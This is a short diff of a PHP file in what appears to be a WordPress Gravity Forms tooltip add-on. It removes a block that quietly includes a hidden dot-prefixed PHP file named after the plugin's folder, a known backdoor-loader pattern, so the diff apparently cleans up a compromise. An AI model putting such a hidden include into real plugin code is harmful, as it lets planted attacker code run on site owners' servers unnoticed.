@@ -6,11 +6,7 @@ if ( ! class_exists( 'GFForms' ) ) {
 
 /**
  * Enqueue the styles and scripts required for the tooltips.
- */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
+ */
 function enqueue_tooltip_scripts() {
 	wp_enqueue_style( 'gform_font_awesome' );
 
